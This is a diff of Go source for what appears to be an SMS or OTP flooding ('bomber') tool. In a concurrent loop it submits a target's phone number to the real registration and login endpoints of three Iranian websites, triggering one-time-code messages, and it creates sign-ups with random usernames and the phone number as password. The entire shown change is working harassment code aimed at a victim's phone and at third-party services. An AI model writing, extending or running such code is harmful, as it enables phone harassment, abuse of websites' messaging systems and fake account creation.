@@ -357,11 +357,11 @@ cookieJar, _ := cookiejar.New(nil)
         Timeout: 10 * time.Second,
 	}
 
-	tasks := make(chan func(), repeatCount*142)
+	tasks := make(chan func(), repeatCount*3)
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*142)
+	ch := make(chan int, repeatCount*3)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -373,8 +373,39 @@ cookieJar, _ := cookiejar.New(nil)
 
 	for i := 0; i < repeatCount; i++ {
 		
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"email": phone,
+				}
+				sendJSONRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", payload, &wg, ch)
+			}
+		}(client)
 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("identity", phone)  
+				formData.Set("switchToOTP", "true")  
+				sendFormRequest(c, ctx, "https://gama.ir/api/v1/users/login", formData, &wg, ch)
+			}
+		}(client)
 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				randomUsername := fmt.Sprintf("user%d", rand.Intn(100000))
+
+				formData := url.Values{}
+				formData.Set("PhoneNumber", phone)
+				formData.Set("UserName", randomUsername) 
+				formData.Set("Password", phone)        
+				formData.Set("ConfirmPassword", phone)   
+				sendFormRequest(c, ctx, "https://www.coffeete.ir/Account/SignUp", formData, &wg, ch)
+			}
+		}(client)
 
 	}
 
